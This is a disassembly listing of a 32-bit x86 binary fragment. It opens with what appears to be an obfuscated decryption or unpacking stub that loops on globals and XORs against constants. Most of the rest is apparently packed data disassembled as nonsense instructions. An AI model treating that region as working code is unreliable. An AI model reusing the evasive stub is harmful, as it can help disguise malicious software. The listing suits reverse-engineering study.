  40791f:	jne    0x407934
  407925:	xor    edi,edi
  407927:	xor    edi,DWORD PTR ds:0x43366b
  40792d:	inc    edi
  40792e:	mov    DWORD PTR ds:0x43366b,edi
  407934:	jmp    0x4078d4
  407939:	mov    DWORD PTR ds:0x4335cb,0x19
  407943:	cmp    DWORD PTR ds:0x4335cb,0x0
  40794a:	je     0x4079ae
  407950:	cmp    DWORD PTR ds:0x4335cb,0x9
  407957:	jne    0x40796e
  40795d:	push   DWORD PTR [ebp-0x1c]
  407960:	push   0x6ccd
  407965:	push   DWORD PTR [ebp-0x10]
  407968:	call   DWORD PTR ds:0x4120c4
  40796e:	cmp    DWORD PTR ds:0x4335cb,0xa
  407975:	jne    0x407988
  40797b:	mov    edi,DWORD PTR ds:0x4335cb
  407981:	dec    edi
  407982:	mov    DWORD PTR ds:0x4335cb,edi
  407988:	mov    edi,DWORD PTR ds:0x4335cb
  40798e:	dec    edi
  40798f:	mov    DWORD PTR ds:0x4335cb,edi
  407995:	jmp    0x407943
  40799a:	xor    edi,edi
  40799c:	add    edi,DWORD PTR ds:0x43366f
  4079a2:	or     edi,DWORD PTR ds:0x4336e3
  4079a8:	mov    DWORD PTR ds:0x43366f,edi
  4079ae:	mov    edi,0xf89f2dad
  4079b3:	and    DWORD PTR ds:0x433633,0x0
  4079bd:	jmp    0x4079cf
  4079c2:	mov    esi,DWORD PTR ds:0x433633
  4079c8:	inc    esi
  4079c9:	mov    DWORD PTR ds:0x433633,esi
  4079cf:	cmp    DWORD PTR ds:0x433633,0x1e
  4079d6:	jae    0x4079f7
  4079dc:	cmp    DWORD PTR ds:0x433633,0x2c
  4079e3:	jne    0x4079f2
  4079e9:	push   DWORD PTR [ebp-0x28]
  4079ec:	call   DWORD PTR ds:0x4120c8
  4079f2:	jmp    0x4079c2
  4079f7:	mov    DWORD PTR [eax],edi
  4079f9:	mov    eax,DWORD PTR [ebp-0x14]
  4079fc:	mov    ebx,DWORD PTR [ebp-0x8]
  4079ff:	mov    ecx,0x7510853
  407a04:	xor    eax,ecx
  407a06:	mov    esi,0x32729a
  407a0b:	xor    ebx,ecx
  407a0d:	xor    edx,edx
  407a0f:	add    eax,esi
  407a11:	add    ebx,esi
  407a13:	div    ebx
  407a15:	mov    edx,DWORD PTR [ebp-0x20]
  407a18:	mov    DWORD PTR [ebp-0x2c],0x4ec5
  407a1f:	cmp    eax,DWORD PTR [edx]
  407a21:	je     0x40936a
  407a27:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407a2e:	lea    eax,[ebp-0xc]
  407a31:	mov    DWORD PTR [ebp-0x10],eax
  407a34:	mov    eax,DWORD PTR [ebp-0x10]
  407a37:	mov    edx,DWORD PTR [eax]
  407a39:	jmp    0x407daf
  407a3e:	sub    eax,0xb2df1e8f
  407a43:	imul   ebp,ebp,0x58ddbe5d
  407a49:	or     BYTE PTR [esi+0x298ee437],cl
  407a4f:	aam    0x7c
  407a51:	jl     0x407a2a
  407a53:	jns    0x407ad1
  407a55:	jl     0x407ad1
  407a57:	push   edi
  407a58:	and    al,0xe
  407a5a:	xchg   ah,ch
  407a5c:	outs   dx,DWORD PTR ds:[esi]
  407a5d:	sahf   
  407a5e:	in     al,dx
  407a5f:	sub    edx,DWORD PTR [edx+0x784b7d5f]
  407a65:	scas   al,BYTE PTR es:[edi]
  407a66:	outs   dx,DWORD PTR ds:[esi]
  407a67:	retf   0xe641
  407a6a:	into   
  407a6b:	push   0xc7ba4ce
  407a70:	sbb    eax,0x4227d115
  407a75:	pop    eax
  407a76:	sub    eax,0xc718ce56
  407a7b:	ss jp  0x407a3a
  407a7e:	mov    dl,0xe3
  407a80:	add    DWORD PTR [edi],0x194a67d0
  407a86:	xor    BYTE PTR [eax-0x191a5b82],cl
  407a8c:	xlat   BYTE PTR ds:[ebx]
  407a8d:	adc    BYTE PTR [ebx-0x3d],ah
  407a90:	je     0x407a45
  407a92:	ror    DWORD PTR [ebx],cl
  407a94:	pusha  
  407a95:	(bad)  
  407a96:	ret    
  407a97:	(bad)  
  407a98:	adc    bh,cl
  407a9a:	or     esi,DWORD PTR [ebp-0x37]
  407a9d:	xlat   BYTE PTR ds:[ebx]
  407a9e:	adc    BYTE PTR [esi+0x6eee1bcc],bh
  407aa4:	push   edi
  407aa5:	dec    esp
  407aa6:	mov    bh,0xd
  407aa8:	add    BYTE PTR [esi+0x1c],dl
  407aab:	pop    edi
  407aac:	add    eax,0xf892acff
  407ab1:	mov    ah,0xf3
  407ab3:	cmp    DWORD PTR [edx+0x14],esp
  407ab6:	pop    ecx
  407ab7:	push   ss
  407ab8:	jmp    FWORD PTR ds:0xc39f4062
  407abe:	inc    ebx
  407abf:	dec    esp
  407ac0:	push   eax
  407ac1:	aad    0xd0
  407ac3:	out    dx,eax
  407ac4:	clc    
  407ac5:	cmp    eax,0x6786c840
  407aca:	and    edx,edx
  407acc:	jg     0x407ad2
  407ace:	dec    esi
  407acf:	mov    ebp,0x4ee785e4
  407ad4:	ins    DWORD PTR es:[edi],dx
  407ad5:	or     ah,bl
  407ad7:	shl    BYTE PTR [ebx+ebp*1-0x11],cl
  407adb:	retf   
  407adc:	sbb    BYTE PTR [edx],bh
  407ade:	mov    ebp,0x586fe247
  407ae3:	dec    eax
  407ae4:	mov    ecx,0xdcca147
  407ae9:	push   esi
  407aea:	mov    bh,0xcf
  407aec:	add    BYTE PTR [ebp+ecx*1-0xe959b4],0x4
  407af4:	enter  0x5c52,0xe9
  407af8:	add    ebx,DWORD PTR [esi-0x5eb52bdc]
  407afe:	and    al,0x47
  407b00:	icebp  
  407b01:	cmp    ch,BYTE PTR [ebp-0x4]
  407b04:	push   esi
  407b05:	test   DWORD PTR [ecx],0xff4e1ff2
  407b0b:	jmp    0x392ea84e
  407b10:	jge    0x407b2b
  407b12:	push   0xffffffb6
  407b14:	repz xor DWORD PTR [ebp-0x11],0x12
  407b19:	mov    cs,ebx
  407b1b:	(bad)  
  407b1c:	push   esi
  407b1d:	lods   al,BYTE PTR ds:[esi]
  407b1e:	inc    esp
  407b1f:	stc    
  407b20:	std    
  407b21:	mov    edi,0x946eda3
  407b26:	je     0x407b3a
  407b28:	mov    ah,0x4b
  407b2a:	cmp    bh,BYTE PTR [ebx+0x306b7516]
  407b30:	test   DWORD PTR [ecx],ebp
  407b32:	bnd jno 0x407b86
  407b35:	js     0x407b2c
  407b37:	jb     0x407add
  407b39:	dec    eax
  407b3a:	jmp    0xb124fd7d
  407b3f:	and    BYTE PTR [edx+0x30f59363],bl
  407b45:	sar    DWORD PTR [esi],1
  407b47:	push   cs
  407b48:	xchg   DWORD PTR [edi+eax*1-0x2a],esi
  407b4c:	pop    edx
  407b4d:	nop
  407b4e:	jg     0x407b07
  407b50:	push   eax
  407b51:	imul   BYTE PTR [ebx+edx*1+0xc]
  407b55:	mov    WORD PTR [ebp-0x73],?
  407b58:	xor    ebp,edx
  407b5a:	and    al,0xf
  407b5c:	ja     0x407bcf
  407b5e:	mul    DWORD PTR [edi+0x6fd9a546]
  407b64:	outs   dx,DWORD PTR ds:[esi]
  407b65:	std    
  407b66:	fwait
  407b67:	push   ebp
  407b68:	sahf   
  407b69:	cmc    
  407b6a:	mov    dl,0xfa
  407b6c:	mov    ebp,0x3e83c5bb
  407b71:	test   al,0x37
  407b73:	pop    edx
  407b74:	test   BYTE PTR [eax+0x15137f6d],cl
  407b7a:	or     DWORD PTR [edx+0x21b59038],ebx
  407b80:	iret   
  407b81:	mov    bl,0x15
  407b83:	imul   eax,DWORD PTR [edx+0x28886dfd],0x41
  407b8a:	fstp   DWORD PTR [eax+ebx*1-0x2a]
  407b8e:	loop   0x407b43
  407b90:	fst    QWORD PTR [ebp+0x6005ab5e]
  407b96:	inc    ecx
  407b97:	cmc    
  407b98:	pop    es
  407b99:	adc    BYTE PTR [ebx],0x7a
  407b9c:	mov    edx,DWORD PTR ss:[eax+ebp*1-0x2a]
  407ba1:	mov    esp,0x58609d65
  407ba6:	dec    edi
  407ba7:	push   eax
  407ba8:	mov    bl,0x9e
  407baa:	das    
  407bab:	pop    eax
  407bac:	bound  esi,QWORD PTR [ecx]
  407bae:	or     edx,esi
  407bb0:	dec    esi
  407bb1:	popf   
  407bb2:	into   
  407bb3:	cli    
  407bb4:	cmp    al,0x7d
  407bb6:	call   0xe4a6924f
  407bbb:	xor    BYTE PTR [eax+edi*8-0x4c86cca7],dl
  407bc2:	and    DWORD PTR [edx-0x6e],ecx
  407bc5:	divps  xmm5,xmm7
  407bc8:	lea    eax,fs:[edx]
  407bcb:	or     eax,0x324db5d5
  407bd0:	(bad)  
  407bd1:	xor    eax,0x90e3e435
  407bd6:	je     0x407be4
  407bd8:	inc    esp
  407bd9:	test   DWORD PTR [edi+eiz*8-0x30],ecx
  407bdd:	loop   0x407c01
  407bdf:	or     ah,0x48
  407be2:	call   0x4a53863
  407be7:	(bad)  
  407be8:	xlat   BYTE PTR ds:[ebx]
  407be9:	xchg   edi,eax
  407bea:	sahf   
  407beb:	fidivr DWORD PTR [ebp+0x7bd82f51]
  407bf1:	js     0x407be5
  407bf3:	adc    BYTE PTR [eax+eiz*4-0xb],ch
  407bf7:	push   0x28
  407bf9:	scas   al,BYTE PTR es:[edi]
  407bfa:	or     al,0xbc
  407bfc:	ja     0x407bbf
  407bfe:	fwait
  407bff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c00:	in     al,0x32
  407c02:	loopne 0x407c40
  407c04:	or     DWORD PTR [ebx-0x73542ecd],ecx
  407c0a:	add    cl,al
  407c0c:	mov    DWORD PTR [ebp-0x64],0xc70ad9bd
  407c13:	loop   0x407c3c
  407c15:	das    
  407c16:	sbb    al,0x67
  407c18:	out    0xf5,eax
  407c1a:	call   0x8d9fe9aa
  407c1f:	fiadd  DWORD PTR [edx]
  407c21:	add    ecx,DWORD PTR [edi+0x38]
  407c24:	lods   eax,DWORD PTR ds:[esi]
  407c25:	inc    eax
  407c26:	gs push 0x68
  407c29:	and    ah,0x40
  407c2c:	call   0x9333:0xbfe02fbc
  407c33:	pop    ecx
  407c34:	int3   
  407c35:	push   ebx
  407c36:	inc    esi
  407c37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c38:	shl    BYTE PTR [edx],1
  407c3a:	mov    ebx,0xe19d1ad8
  407c3f:	xor    BYTE PTR [edi-0x5ed8c24c],cl
  407c45:	ror    DWORD PTR [edi-0x70],cl
  407c48:	gs jmp 0x407bd2
  407c4b:	fadd   st,st(5)
  407c4d:	sub    DWORD PTR [eax+edi*4-0x69],ebp
  407c51:	sub    al,0x2
  407c53:	cli    
  407c54:	fs pop edi
  407c56:	sbb    bl,BYTE PTR [eiz*4-0x4094de65]
  407c5d:	xchg   esi,eax
  407c5e:	in     al,0x79
  407c60:	dec    esi
  407c61:	jb     0x407c5b
  407c63:	test   eax,0x1e2d9cd6
  407c68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c69:	and    BYTE PTR [eax+0x35],al
  407c6c:	mov    ebx,0x6530565e
  407c71:	call   0xc4870878
  407c76:	xchg   ebx,eax
  407c77:	cmp    al,0x38
  407c79:	je     0x407c70
  407c7b:	dec    esi
  407c7c:	xor    BYTE PTR [ecx+0x5c7829ca],0xc6
  407c83:	sbb    BYTE PTR ds:0xfa78249f,al
  407c89:	add    eax,0x839cb204
  407c8e:	cmp    bh,al
  407c90:	into   
  407c91:	cmp    bh,ah
  407c93:	hlt    
  407c94:	ror    eax,1
  407c96:	rol    BYTE PTR [ebx+edi*1+0x6391b6cd],1
  407c9d:	mov    esp,0x8a0742d3
  407ca2:	pusha  
  407ca3:	repz jo 0x407cfd
  407ca6:	push   ebx
  407ca7:	sbb    BYTE PTR [ebx-0x4cc1d439],cl
  407cad:	jmp    0x6d31:0x34c387c8
  407cb4:	call   DWORD PTR [ebx+ecx*4+0x65]
  407cb8:	and    ebx,eax
  407cba:	cmp    al,0x36
  407cbc:	push   es
  407cbd:	push   ebp
  407cbe:	mov    ch,0xa2
  407cc0:	inc    eax
  407cc1:	or     BYTE PTR [edi+0x63df2ce1],al
  407cc7:	push   eax
  407cc8:	sar    DWORD PTR [ecx],0x39
  407ccb:	cli    
  407ccc:	xchg   edi,eax
  407ccd:	jnp    0x407cf9
  407ccf:	jno    0x407d50
  407cd1:	jmp    0x407d4e
  407cd3:	mov    eax,0x9eb18222
  407cd8:	push   esi
  407cd9:	retf   
  407cda:	push   ss
  407cdb:	ja     0x407cb1
  407cdd:	mov    bl,0x23
  407cdf:	cmp    ch,BYTE PTR [edi+0x6b072ff3]
  407ce5:	xchg   ebp,eax
  407ce6:	push   edx
  407ce7:	ss jo  0x407cca
  407cea:	cdq    
  407ceb:	mov    dh,0xb2
  407ced:	push   esp
  407cee:	xchg   edi,eax
  407cef:	cmp    DWORD PTR [eax-0x2c6b8ddc],edi
  407cf5:	cmp    al,0x94
  407cf7:	nop
  407cf8:	jmp    FWORD PTR [ecx+0x50]
  407cfb:	jns    0x407c9d
  407cfd:	mov    al,BYTE PTR [edx+0x79059547]
  407d03:	mov    esp,0x46daec97
  407d08:	or     al,0x7f
  407d0a:	xchg   esi,eax
  407d0b:	pop    edi
  407d0c:	jmp    0x5c6f:0xc267abf6
  407d13:	mov    cl,0x10
  407d15:	retf   0x3ea7
  407d18:	stos   DWORD PTR es:[edi],eax
  407d19:	push   ecx
  407d1a:	add    ebx,DWORD PTR [esi-0x159c768a]
  407d20:	cdq    
  407d21:	shl    BYTE PTR ss:[ebx-0x4bdb30b2],cl
  407d28:	stos   DWORD PTR es:[edi],eax
  407d29:	mov    bl,0xcb
  407d2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d2c:	lds    ecx,FWORD PTR [eax]
  407d2e:	xor    eax,0x1ae0d415
  407d33:	pop    esp
  407d34:	inc    eax
  407d35:	mov    edi,0x62f5db6e
  407d3a:	(bad)  
  407d3b:	iret   
  407d3c:	add    al,0x60
  407d3e:	ror    ecx,0x5d
  407d41:	mov    ds:0xd4fa65d7,al
  407d46:	inc    eax
  407d47:	mov    ds:0x6635afff,al
  407d4c:	(bad)  
  407d4d:	fcom   DWORD PTR [esi+0x203bee0a]
  407d53:	fimul  DWORD PTR ds:0x97e4c243
  407d59:	in     al,dx
  407d5a:	mov    ds,WORD PTR [eax-0x59]
  407d5d:	pop    ebp
  407d5e:	aas    
  407d5f:	jge    0x407db4
  407d61:	data16 jp 0x407d6c
  407d64:	jle    0x407d29
  407d66:	mov    ah,0x31
  407d68:	call   0x9a75132f
  407d6d:	test   DWORD PTR [esi],0xab47f9c2
  407d73:	in     eax,dx
  407d74:	inc    ebx
  407d75:	cmp    BYTE PTR [edx-0x1e559a08],0x4d
  407d7c:	mov    ebx,0xdae93066
  407d81:	jmp    0xd78f:0x79139aa
  407d88:	sub    al,0x40
  407d8a:	pop    eax
  407d8b:	jmp    0x407dd5
  407d8d:	cmp    DWORD PTR [eax+edx*1-0x72c7e7ec],edi
  407d94:	loopne 0x407d93
  407d96:	cdq    
  407d97:	adc    eax,0xa7d65b06
  407d9c:	(bad)
  407da0:	lahf   
  407da1:	fs pop es
  407da3:	sbb    cl,ch
  407da5:	enter  0xe8fa,0xbf
  407da9:	xchg   esp,eax
  407daa:	ret    0x851c
  407dad:	push   es
  407dae:	iret   
  407daf:	imul   edx,edx,0xf89ea9e8
  407db5:	mov    DWORD PTR [eax],edx
  407db7:	mov    eax,DWORD PTR [ebp-0xc]
  407dba:	cmp    eax,0x58133098
  407dbf:	jmp    0x408135
  407dc4:	cwde   
  407dc5:	mov    eax,ds:0x5b4dbc42
  407dca:	mov    ds:0x4fdb206d,al
  407dcf:	or     ch,ch
  407dd1:	jns    0x407e4a
  407dd3:	pop    esi
  407dd4:	adc    cl,0x7c
  407dd7:	jl     0x407db0
  407dd9:	jns    0x407e57
  407ddb:	jl     0x407dfd
  407ddd:	mov    esi,0xbbeb2428
  407de2:	xchg   ecx,eax
  407de3:	xchg   DWORD PTR [ecx+esi*1],ecx
  407de6:	or     DWORD PTR [ebp-0x1e],esi
  407de9:	push   es
  407dea:	fwait
  407deb:	sub    al,0xde
  407ded:	and    eax,0xe1a43ff3
  407df2:	adc    BYTE PTR [ebx+0x56daf031],ah
  407df8:	lds    ebp,FWORD PTR [ecx+eax*2+0x2cd36710]
  407dff:	jge    0x407e4c
  407e01:	lahf   
  407e02:	ret    
  407e03:	or     dh,BYTE PTR [ecx+0x2a]
  407e06:	stc    
  407e07:	xchg   ebp,eax
  407e08:	stos   BYTE PTR es:[edi],al
  407e09:	mov    dh,0x25
  407e0b:	and    ecx,DWORD PTR [ebx+0x5b176215]
  407e11:	pop    ebp
  407e12:	in     eax,dx
  407e13:	mov    edx,0x487496bc
  407e18:	mov    ah,0xd0
  407e1a:	push   ebp
  407e1b:	shl    BYTE PTR [esi],0x37
  407e1e:	jmp    0x18760844
  407e23:	mul    DWORD PTR [ecx-0x442048f8]
  407e29:	pop    esp
  407e2a:	or     DWORD PTR [edx-0xe893870],esp
  407e30:	mov    esi,0x85e48059
  407e35:	sbb    DWORD PTR ds:0x6f9a8114,ebp
  407e3b:	mov    bh,0x3f
  407e3d:	sar    BYTE PTR cs:[esi+0x63],0xdf
  407e42:	(bad)  
  407e43:	test   ch,ch
  407e45:	loope  0x407e14
  407e47:	ins    DWORD PTR es:[edi],dx
  407e48:	mov    ds:0xc36d72b9,al
  407e4d:	(bad)  
  407e4e:	or     al,0xd6
  407e50:	and    eax,0xfd88815e
  407e55:	loopne 0x407e54
  407e57:	cmp    BYTE PTR [ecx+0x6d],ch
  407e5a:	fs push ds
  407e5c:	mov    ebx,0x1a5d2f24
  407e61:	mov    bh,0x8b
  407e63:	xor    DWORD PTR [ecx+0x3e],edi
  407e66:	cmc    
  407e67:	out    0x2a,al
  407e69:	pop    ebx
  407e6a:	xor    BYTE PTR [ebp-0x198d6f2a],al
  407e70:	mov    ah,0x1a
  407e72:	daa    
  407e73:	mov    ds:0x712471c2,eax
  407e78:	push   esp
  407e79:	test   al,0xee
  407e7b:	cmp    bl,BYTE PTR fs:[ebx+edx*2+0xba5070e]
  407e83:	(bad)  
  407e85:	cmp    BYTE PTR [edi-0x49ffc20f],bl
  407e8b:	aas    
  407e8c:	xor    eax,0x1c
  407e8f:	sub    DWORD PTR [eax],esp
  407e91:	dec    esi
  407e92:	aas    
  407e93:	mov    ch,0x99
  407e95:	int3   
  407e96:	push   ebp
  407e97:	mov    ds:0x871a5ece,eax
  407e9c:	inc    ebp
  407e9d:	mov    cl,0xbf
  407e9f:	cmc    
  407ea0:	lahf   
  407ea1:	pop    ds
  407ea2:	rcl    DWORD PTR [edx-0x1bca6503],0x5a
  407ea9:	imul   edi,esi,0x58
  407eac:	and    DWORD PTR cs:[edx],ebx
  407eaf:	push   ecx
  407eb0:	jns    0x407e99
  407eb2:	adc    al,BYTE PTR [edx-0x77877398]
  407eb8:	jmp    0x407e83
  407eba:	ror    BYTE PTR [ecx+edi*8+0x63380c9a],1
  407ec1:	ins    DWORD PTR es:[edi],dx
  407ec2:	jmp    0x6e932b96
  407ec7:	stos   BYTE PTR es:[edi],al
  407ec8:	adc    eax,0xa6997d11
  407ecd:	mov    ebp,0xe7b12a7
  407ed2:	in     eax,dx
  407ed3:	leave  
  407ed4:	in     eax,dx
  407ed5:	mov    ah,0x48
  407ed7:	in     eax,0x9d
  407ed9:	push   0x82e4e528
  407ede:	popa   
  407edf:	pop    es
  407ee0:	out    dx,eax
  407ee1:	ds fcomp st(1)
  407ee4:	sub    al,0x8e
  407ee6:	test   BYTE PTR [ecx+0x1bfd26ff],dh
  407eec:	mov    esp,0x5fd8d2fa
  407ef1:	inc    ebx
  407ef2:	inc    edx
  407ef3:	push   ds
  407ef4:	ja     0x407eec
  407ef6:	leave  
  407ef7:	or     BYTE PTR [ecx],bh
  407ef9:	dec    ecx
  407efa:	xor    edi,edx
  407efc:	test   bl,ah
  407efe:	jmp    0x46af:0x4e930ad1
  407f05:	push   edi
  407f06:	pop    ebp
  407f07:	pop    ebx
  407f08:	mov    al,ds:0x9e1b7921
  407f0d:	bound  edi,QWORD PTR [ebx]
  407f0f:	hlt    
  407f10:	push   esp
  407f12:	lods   al,BYTE PTR ds:[esi]
  407f13:	mov    DWORD PTR [edi+ebx*4-0x73],ebp
  407f17:	jnp    0x407f69
  407f19:	fdiv   DWORD PTR [edi+0x46]
  407f1c:	ret    0xefff
  407f1f:	cdq    
  407f20:	inc    ebp
  407f21:	xchg   edi,eax
  407f22:	sbb    BYTE PTR [eax],bl
  407f24:	bound  esi,QWORD PTR [ecx+edx*8]
  407f27:	cwde   
  407f28:	or     eax,0x6c3fafc0
  407f2d:	xor    edx,DWORD PTR [edx-0x31]
  407f30:	inc    eax
  407f31:	sub    esp,DWORD PTR [eax-0x4c6d7c52]
  407f37:	fs stc 
  407f39:	test   eax,0x694c61f4
  407f3e:	jnp    0x407ef4
  407f40:	or     al,0x1b
  407f42:	sbb    BYTE PTR [eax],bl
  407f44:	inc    ecx
  407f45:	scas   al,BYTE PTR es:[edi]
  407f46:	ret    0x8a41
  407f49:	ret    
  407f4a:	dec    edx
  407f4b:	in     al,dx
  407f4c:	(bad)  
  407f4e:	mov    dl,0x5a
  407f50:	add    eax,0x8828a090
  407f55:	shr    BYTE PTR [ebx+0x30],1
  407f58:	and    DWORD PTR [ebp+0x7d],eax
  407f5b:	add    eax,0xe210ad48
  407f60:	fisttp WORD PTR [ebx-0x25]
  407f63:	add    al,0xc
  407f65:	add    DWORD PTR [ebp-0x15],0x59e3a36b
  407f6c:	test   dh,bh
  407f6e:	xor    esi,edx
  407f70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f71:	inc    eax
  407f72:	push   esp
  407f73:	into   
  407f74:	mov    ebp,0x11bdc89b
  407f79:	sbb    BYTE PTR [edx-0x5bd93dba],ah
  407f7f:	xchg   edi,eax
  407f80:	sub    DWORD PTR [bp+0x6a],ebx
  407f84:	stos   BYTE PTR es:[edi],al
  407f85:	mov    al,0x9e
  407f87:	pusha  
  407f88:	add    DWORD PTR [esi],0xffffffa1
  407f8b:	setg   ch
  407f8e:	loope  0x407fbf
  407f90:	aam    0xa2
  407f92:	pop    si
  407f94:	jae    0x407fe4
  407f96:	pop    edx
  407f97:	enter  0xd60e,0xd6
  407f9b:	inc    edx
  407f9c:	dec    ebx
  407f9d:	add    esp,DWORD PTR [eax+ebp*4]
  407fa0:	jmp    DWORD PTR [ebx-0x1e0bc1c9]
  407fa6:	call   edx
  407fa8:	jmp    0x614db472
  407fad:	mov    al,0xa6
  407faf:	xchg   edi,eax
  407fb0:	lods   eax,DWORD PTR ds:[esi]
  407fb1:	or     eax,0xb0108619
  407fb6:	ficomp WORD PTR ds:0x52b50661
  407fbc:	dec    ebp
  407fbd:	push   ebp
  407fbe:	xchg   ecx,eax
  407fbf:	cmp    bl,BYTE PTR [eax+0x39d80828]
  407fc5:	test   eax,0xdbc5c2fc
  407fca:	sub    DWORD PTR [ecx+0x33],ebp
  407fcd:	jg     0x407fac
  407fcf:	push   edx
  407fd0:	cmp    esp,eax
  407fd2:	(bad)  
  407fd3:	mov    ds:0x413d8682,eax
  407fd8:	sbb    DWORD PTR ds:0xc040bca4,ecx
  407fde:	das    
  407fdf:	sub    DWORD PTR [ecx-0x53],eax
  407fe2:	dec    ebp
  407fe3:	ds jp  0x40803c
  407fe6:	inc    ecx
  407fe7:	mov    ecx,0x2eb589f9
  407fec:	xchg   bp,ax
  407fee:	mov    bl,0xe
  407ff0:	repz mov esp,0x4b7c0c1
  407ff6:	fild   QWORD PTR [edx-0x64943718]
  407ffc:	fcmovnb st,st(4)
  407ffe:	jp     0x408057
  408000:	shr    ebp,0x3c
  408003:	retf   0x66c9
  408006:	cwde   
  408007:	pusha  
  408008:	push   esi
  408009:	(bad)  
  40800b:	jae    0x408037
  40800d:	ja     0x408047
  40800f:	cmp    BYTE PTR [eax+0x39],al
  408012:	fnstsw WORD PTR ds:0xcdf5eed0
  408018:	sbb    BYTE PTR [ebp+eiz*4-0x6f],al
  40801c:	rol    al,1
  40801e:	jbe    0x408025
  408020:	pop    edx
  408021:	mov    ecx,edx
  408023:	cmp    BYTE PTR [ebp+0x28101170],0xef
  40802a:	add    eax,0x7e26b5a9
  40802f:	shl    edx,cl
  408031:	jp     0x407ff7
  408033:	cmp    bh,BYTE PTR [eax+0x28]
  408036:	dec    ebx
  408037:	pop    es
  408038:	lods   eax,DWORD PTR ds:[esi]
  408039:	mov    eax,0x489309b
  40803e:	jmp    0xe082:0x6b32d6e0
  408045:	cmp    esp,DWORD PTR [ebx+0x52]
  408048:	les    edx,FWORD PTR [eax-0x62]
  40804b:	shl    BYTE PTR ds:0xe712cd80,1
  408051:	or     DWORD PTR [eax-0x59],ecx
  408054:	fdiv   QWORD PTR ds:[esi]
  408057:	dec    ebx
  408058:	hlt    
  408059:	int3   
  40805a:	dec    ebx
  40805b:	popa   
  40805c:	pusha  
  40805d:	stos   BYTE PTR es:[edi],al
  40805e:	lods   eax,DWORD PTR ds:[esi]
  40805f:	cmp    dh,BYTE PTR ds:0xdb38aa53
  408065:	stos   BYTE PTR es:[edi],al
  408066:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408067:	daa    
  408068:	outs   dx,BYTE PTR ds:[esi]
  408069:	shr    DWORD PTR [ecx+0x236f8e1],0xe2
  408070:	adc    ch,BYTE PTR [ebp+eiz*1+0x5a]
  408074:	rcr    BYTE PTR [edi],0xff
  408077:	loop   0x407ffe
  408079:	in     eax,dx
  40807a:	sbb    eax,0x6ed5acea
  40807f:	jae    0x40809b
  408081:	push   eax
  408082:	cmp    eax,0xcb2b19ef
  408087:	repnz neg BYTE PTR [edi+0x64]
  40808b:	and    BYTE PTR [edx+ebx*2-0x13],cl
  40808f:	add    eax,DWORD PTR ds:0x6faaad22
  408095:	ret    0xcdfb
  408098:	(bad)  
  408099:	out    0xbc,al
  40809b:	scas   eax,DWORD PTR es:[edi]
  40809c:	mov    ds:0x65284aca,al
  4080a1:	xchg   ebp,eax
  4080a2:	push   ebx
  4080a3:	call   DWORD PTR [edx+0x20]
  4080a6:	lock repnz pop edi
  4080a9:	fild   DWORD PTR [edx+0x60]
  4080ac:	sub    ebp,esi
  4080ae:	or     BYTE PTR [edi+ecx*1],al
  4080b1:	push   esp
  4080b2:	sar    dl,cl
  4080b4:	pop    ds
  4080b5:	cmp    DWORD PTR [edi-0x49],esp
  4080b8:	loop   0x4080c1
  4080ba:	outs   dx,BYTE PTR ds:[esi]
  4080bb:	scas   eax,DWORD PTR es:[edi]
  4080bc:	mov    esp,0xa1dfb13b
  4080c1:	ror    DWORD PTR [eax],0x6d
  4080c4:	ror    BYTE PTR [edx+0x67b2cd2b],cl
  4080ca:	mov    ch,0xf8
  4080cc:	(bad)  
  4080cd:	xchg   DWORD PTR [edi-0x700df14b],ebx
  4080d3:	mov    ds:0x4f3d5cd9,al
  4080d8:	int    0x45
  4080da:	test   eax,0x7dadd968
  4080df:	add    al,0xae
  4080e1:	xchg   esp,eax
  4080e2:	sub    eax,0x82d4e608
  4080e7:	scas   al,BYTE PTR es:[edi]
  4080e8:	pop    DWORD PTR [ebx+0x43]
  4080eb:	jns    0x408136
  4080ed:	add    BYTE PTR [edx+0x793413f0],ch
  4080f3:	imul   esi,esp,0x77
  4080f6:	jo     0x4080ce
  4080f8:	push   es
  4080f9:	addr16 cmp cl,al
  4080fc:	or     al,0x38
  4080fe:	jecxz  0x4080dd
  408100:	push   ebx
  408101:	gs sbb ebp,eax
  408104:	gs xchg esi,eax
  408106:	nop
  408107:	adc    bh,BYTE PTR [ecx-0xd1ceec5]
  40810d:	push   ebp
  40810e:	xor    bh,bh
  408110:	dec    ebp
  408111:	xor    al,0xe3
  408113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408114:	js     0x408098
  408116:	pushf  
  408117:	push   0xfa513d85
  40811c:	into   
  40811d:	and    DWORD PTR [ebp+0x51],0x3b
  408121:	fcomp  QWORD PTR [ebx+0x61c28379]
  408127:	mov    DWORD PTR [edx-0x2b45c20e],ecx
  40812d:	addr16 dec edx
  40812f:	jmp    0xff0:0xa9255a98
  408136:	test   BYTE PTR [ebp-0x74fffffd],cl
  40813c:	inc    ebp
  40813d:	in     al,0x81
  40813f:	or     BYTE PTR [eax-0x169f8ae4],bl
  408145:	jno    0x40814a
  408147:	add    BYTE PTR [eax],al
  408149:	pop    edx
  40814a:	jns    0x4080ea
  40814c:	fs bound ecx,QWORD PTR gs:[di]
  408151:	add    ebp,ebp
  408153:	push   ebx
  408154:	sbb    edx,DWORD PTR [ecx]
  408156:	jb     0x4081c0
  408158:	pop    ebx
  408159:	pop    ebx
  40815a:	sar    BYTE PTR [esp+edi*2-0x29],cl
  40815e:	jns    0x4081dc
  408160:	jl     0x4081bb
  408162:	fcomp  DWORD PTR [esi]
  408165:	adc    BYTE PTR [edi+0x71],cl
  408168:	push   es
  408169:	fdiv   QWORD PTR [ebp+0x7eb34129]
  40816f:	cmp    bh,BYTE PTR [edi+0x48e8697e]
  408175:	pushf  
  408176:	sahf   
  408177:	test   DWORD PTR [ebx],ecx
  408179:	stos   DWORD PTR es:[edi],eax
  40817a:	sahf   
  40817b:	add    DWORD PTR [eax+0x29],edx
  40817e:	iret   
  40817f:	mov    ds:0xa7973548,eax
  408184:	sub    al,0xe7
  408186:	and    ebx,ebx
  408188:	sbb    DWORD PTR [ebx+0x3b75d446],ecx
  40818e:	xchg   DWORD PTR [edi-0x7],ebp
  408191:	int    0x9c
  408193:	loop   0x408132
  408195:	js     0x408159
  408197:	jmp    0x2b4e:0x8814e9e4
